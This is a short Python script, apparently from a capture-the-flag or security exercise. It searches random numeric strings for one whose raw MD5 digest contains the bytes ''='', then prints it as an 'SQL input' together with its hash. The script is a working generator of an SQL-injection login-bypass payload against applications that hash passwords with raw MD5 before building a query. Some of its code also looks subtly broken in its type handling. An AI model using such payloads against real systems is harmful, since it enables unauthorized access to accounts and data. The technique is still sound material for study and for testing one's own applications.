from pymd5 import md5
import os, random, re, time

start = time.time()
while(True):
    maxint = (2**31)/2 - 1
    teststr = ""
    test1 = random.randint(0, maxint)
    test2 = random.randint(0, maxint)
    test3 = random.randint(0, maxint)
    teststr = md5(str(test1) + str(test2) + str(test3)).digest()
    match = re.search(b"'='", teststr)

    if match:
        print ("SQL input:\t", str(test1)+str(test2)+str(test3))
        print("md5 hash:\t",teststr)
        break

end = time.time()
print("Elapsed time:\t", end - start, "seconds")